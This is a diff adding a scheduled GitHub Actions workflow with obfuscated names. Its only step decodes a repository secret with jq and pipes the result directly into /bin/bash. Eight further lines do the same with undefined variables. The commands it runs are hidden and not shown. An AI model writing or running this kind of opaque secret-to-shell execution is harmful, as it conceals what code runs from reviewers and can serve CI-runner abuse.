@@ -1,0 +1,25 @@
+name: xiangweiyongsheng
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangweiyongsheng
+        env:
+          e956: ${{ secrets.e956 }}
+        run: |
+          echo $e956 | jq -r .mv97676 | /bin/bash
+          echo $z9 | jq -r .uxd63 | /bin/bash
+          echo $z5 | jq -r .xqazv7753 | /bin/bash
+          echo $zmzma1245 | jq -r .qwc513 | /bin/bash
+          echo $hhmp1529 | jq -r .xhysl69018 | /bin/bash
+          echo $iypr114 | jq -r .n7 | /bin/bash
+          echo $txe82 | jq -r .iqb62827 | /bin/bash
+          echo $jldv92 | jq -r .qw545 | /bin/bash
+          echo $jmpap57 | jq -r .e3674 | /bin/bash
+
